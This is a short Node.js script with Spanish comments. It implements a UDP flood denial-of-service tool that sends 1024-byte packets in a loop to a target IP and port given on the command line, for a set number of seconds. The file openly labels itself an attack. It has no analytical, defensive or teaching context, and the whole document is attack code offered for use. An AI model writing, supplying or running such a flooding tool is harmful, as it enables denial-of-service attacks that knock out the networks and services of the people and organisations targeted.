// udp.js

const dgram = require('dgram');

// Función para enviar paquetes UDP
function udpFlood(targetIp, targetPort, duration) {
  const socket = dgram.createSocket('udp4'); // IPv4

  const startTime = Date.now();

  while (Date.now() - startTime < duration * 1000) { // Duración en segundos

    const message = Buffer.alloc(1024, 'A'); // Cambia el tamaño del paquete si quieres
    socket.send(message, 0, message.length, targetPort, targetIp, (err) => {
      if (err) {
        console.error('Error al enviar el paquete:', err);
      }
    });
  }

  socket.close(); // Cierra el socket después de la inundación.
  console.log('Inundación completada.');
}

// Obtener los argumentos de la línea de comandos
const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

// Validar los argumentos
if (!targetIp || isNaN(targetPort) || isNaN(duration)) {
  console.log('Uso: node udpflooder.js <ip_objetivo> <puerto_objetivo> <duracion_en_segundos>');
  process.exit(1);
}

// Iniciar el ataque
console.log(`Iniciando inundación UDP a ${targetIp}:${targetPort} durante ${duration} segundos...`);
udpFlood(targetIp, targetPort, duration);
